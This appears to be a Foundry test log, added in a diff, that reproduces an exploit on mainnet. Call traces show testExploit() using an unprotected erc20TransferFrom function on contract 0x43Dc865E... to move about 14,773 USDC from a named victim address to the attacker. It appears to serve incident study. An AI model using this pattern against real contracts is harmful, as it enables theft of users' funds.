@@ -1,0 +1,61 @@
+No files changed, compilation skipped
+
+Ran 1 test for test/Erc20transfer_exp.sol:Erc20transfer
+[PASS] testExploit() (gas: 86185)
+Logs:
+  Attacker Before exploit USDC Balance: 0.000000
+  Attacker After exploit USDC Balance: 14773.350000
+
+Traces:
+  [10735] Erc20transfer::setUp()
+    ├─ [0] VM::createSelectFork("mainnet", 21019771 [2.101e7])
+    │   └─ ← [Return] 0
+    └─ ← [Stop]
+
+  [90985] Erc20transfer::testExploit()
+    ├─ [10370] FiatTokenProxy::fallback() [staticcall]
+    │   ├─ [3081] FiatTokenV2_2::symbol() [delegatecall]
+    │   │   └─ ← [Return] "USDC"
+    │   └─ ← [Return] "USDC"
+    ├─ [3339] FiatTokenProxy::fallback(Erc20transfer: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   ├─ [2553] FiatTokenV2_2::balanceOf(Erc20transfer: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
+    │   │   └─ ← [Return] 0
+    │   └─ ← [Return] 0
+    ├─ [3164] FiatTokenProxy::fallback() [staticcall]
+    │   ├─ [2381] FiatTokenV2_2::decimals() [delegatecall]
+    │   │   └─ ← [Return] 6
+    │   └─ ← [Return] 6
+    ├─ emit log_named_decimal_uint(key: "Attacker Before exploit USDC Balance", val: 0, decimals: 6)
+    ├─ [44179] 0x43Dc865E916914FD93540461FdE124484FBf8fAa::erc20TransferFrom(FiatTokenProxy: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48], Erc20transfer: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x3DADf003AFCC96d404041D8aE711B94F8C68c6a5, 0)
+    │   ├─ [3339] FiatTokenProxy::fallback(0x3DADf003AFCC96d404041D8aE711B94F8C68c6a5) [staticcall]
+    │   │   ├─ [2553] FiatTokenV2_2::balanceOf(0x3DADf003AFCC96d404041D8aE711B94F8C68c6a5) [delegatecall]
+    │   │   │   └─ ← [Return] 14773350000 [1.477e10]
+    │   │   └─ ← [Return] 14773350000 [1.477e10]
+    │   ├─ [38049] FiatTokenProxy::fallback(0x3DADf003AFCC96d404041D8aE711B94F8C68c6a5, Erc20transfer: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 14773350000 [1.477e10])
+    │   │   ├─ [37254] FiatTokenV2_2::transferFrom(0x3DADf003AFCC96d404041D8aE711B94F8C68c6a5, Erc20transfer: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 14773350000 [1.477e10]) [delegatecall]
+    │   │   │   ├─ emit Transfer(from: 0x3DADf003AFCC96d404041D8aE711B94F8C68c6a5, to: Erc20transfer: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 14773350000 [1.477e10])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0xc7e3aaf13663a01c05eea5f697617bb5eeca2740e64aa42ce573a1ceb4eb8904: 0x00000000000000b88e282822ab5ed106947c1c60af583c1741a38e858de00000 → 0x00000000000000b88e282822ab5ed106947c1c60af583c1741a38e821d509190
+    │   │   │   │   @ 0xea80dd88ed2c8da1b3cfa53b6b2568ae58fe83d484d0c01324a62ba1aa9ffdac: 0 → 0x00000000000000000000000000000000000000000000000000000003708f6e70
+    │   │   │   │   @ 0x7bd01edf03b4e912d34d3dd59b8162392c1eb78d6bc9cd4b9b21b3c9691a6846: 0x00000000000000000000000000000000000000000000000000000003708f6e70 → 0
+    │   │   │   └─ ← [Return] true
+    │   │   └─ ← [Return] true
+    │   └─ ← [Stop]
+    ├─ [1870] FiatTokenProxy::fallback() [staticcall]
+    │   ├─ [1081] FiatTokenV2_2::symbol() [delegatecall]
+    │   │   └─ ← [Return] "USDC"
+    │   └─ ← [Return] "USDC"
+    ├─ [1339] FiatTokenProxy::fallback(Erc20transfer: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   ├─ [553] FiatTokenV2_2::balanceOf(Erc20transfer: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
+    │   │   └─ ← [Return] 14773350000 [1.477e10]
+    │   └─ ← [Return] 14773350000 [1.477e10]
+    ├─ [1164] FiatTokenProxy::fallback() [staticcall]
+    │   ├─ [381] FiatTokenV2_2::decimals() [delegatecall]
+    │   │   └─ ← [Return] 6
+    │   └─ ← [Return] 6
+    ├─ emit log_named_decimal_uint(key: "Attacker After exploit USDC Balance", val: 14773350000 [1.477e10], decimals: 6)
+    └─ ← [Stop]
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 4.10s (2.75s CPU time)
+
+Ran 1 test suite in 5.31s (4.10s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
